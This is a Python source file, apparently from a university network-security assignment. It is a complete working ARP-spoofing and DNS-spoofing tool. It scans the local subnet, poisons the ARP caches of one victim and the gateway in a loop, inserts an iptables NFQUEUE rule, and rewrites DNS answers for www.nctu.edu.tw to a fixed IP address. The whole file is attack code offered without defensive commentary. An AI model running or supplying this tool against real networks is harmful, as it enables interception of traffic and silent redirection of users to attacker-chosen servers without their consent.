import socket
from scapy.all import *
import netifaces
import time
import threading
import os
import netfilterqueue

def PrintBoxMsg(col1, col2):
	print('-'*41)
	print(col1 + '\t\t\t' + col2)
	print('-'*41)

def ScanDevices():
	global nickname

	gateway_addr = netifaces.gateways()['default'][netifaces.AF_INET][0]
	nickname = netifaces.gateways()['default'][netifaces.AF_INET][1]

	for interface in netifaces.interfaces():
		if interface == nickname:
			local_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
			try:
				local_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
				netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
			except KeyError:
				pass

	dst_addr = str(gateway_addr) + '/' + str(sum(bin(int(x)).count('1') for x in netmask.split('.')))

	eth = Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp = ARP(psrc = local_ip, pdst = dst_addr)
	pkt = eth/arp
	result = srp(pkt, timeout = 1, verbose = False)[0]
	
	PrintBoxMsg('IP', 'MAC Address')

	client_list = []
	AP_info = {}
	for element in result:
		client = {'ip': element[1].psrc, 'mac': element[1].hwsrc}
		if element[1].psrc != gateway_addr:
			client_list.append(client)
		else:
			AP_info = client
	
	# delete *.1 and *.254
	if len(client_list) == 3:
		del client_list[2]
		del client_list[0]

	for client in client_list:
		print(client['ip'] + '\t\t' + client['mac'])

	return client_list, AP_info

def SpoofARP(target_ip, target_mac, spoof_ip):
	pkt = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
	send(pkt, verbose = False)

def SendSpoofARP(client_list, AP_info):
	while True:
		SpoofARP(AP_info['ip'], AP_info['mac'], client_list[0]['ip'])
		SpoofARP(client_list[0]['ip'], client_list[0]['mac'], AP_info['ip'])
		time.sleep(2)

def HandlePacket(pkt):
    if IP(pkt.get_payload()).haslayer(DNSRR):
        dns_pkt = IP(pkt.get_payload())
        qname = dns_pkt[DNSQR].qname
        if b'www.nctu.edu.tw' in qname:
            dns_pkt[DNS].an = DNSRR(rrname = qname, rdata = '140.113.207.246')
            dns_pkt[DNS].ancount = 1

            del dns_pkt[IP].len
            del dns_pkt[IP].chksum
            del dns_pkt[UDP].len
            del dns_pkt[UDP].chksum

            pkt.set_payload(bytes(dns_pkt))
    pkt.accept()

client_list, AP_info = ScanDevices()
t = threading.Thread(target = SendSpoofARP, args=(client_list, AP_info), daemon = True)
t.start()

os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')

queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, HandlePacket)
    queue.run()
except KeyboardInterrupt:
    os.system('iptables --flush')
    exit(0)
